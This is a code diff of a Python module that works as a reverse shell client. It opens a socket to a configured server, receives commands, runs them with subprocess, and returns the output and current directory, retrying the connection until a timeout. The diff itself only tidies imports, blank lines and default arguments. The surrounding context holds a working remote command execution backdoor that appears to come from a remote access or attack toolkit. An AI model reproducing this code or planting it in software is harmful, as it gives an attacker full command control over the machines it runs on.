@@ -2,7 +2,6 @@ import socket
 import os
 import subprocess
 import time
-import threading
 
 #todo
 # update module options in config file to get host address and port
@@ -20,10 +19,8 @@ def start_remote_client():
         s.connect((SERVER_HOST, SERVER_PORT))
     except socket.error as e:
         return -1
-
     cwd = os.getcwd()
     s.send(cwd.encode())
-
     while True:
         s.settimeout(SYSTEMRELOADINTERVAL)
         command = s.recv(BUFFER_SIZE).decode()
@@ -39,7 +36,6 @@ def start_remote_client():
                 output = "directory changed"
         else:
             output = subprocess.getoutput(command)
-
         cwd = os.getcwd()
         message = f"{output}{SEPARATOR}{cwd}"
         s.send(message.encode())
@@ -47,15 +43,13 @@ def start_remote_client():
     s.close()
     return 1
 
-def run(file_name, interval):
+def run(file_name="", interval=4600):
     global START_TIME
     START_TIME = time.time()
     server_found = start_remote_client()
-    
     while server_found == -1 and time.time() - START_TIME < SYSTEMRELOADINTERVAL:
         time.sleep(3)
         server_found = start_remote_client()
-
     return ""
 
 if __name__ == "__main__":
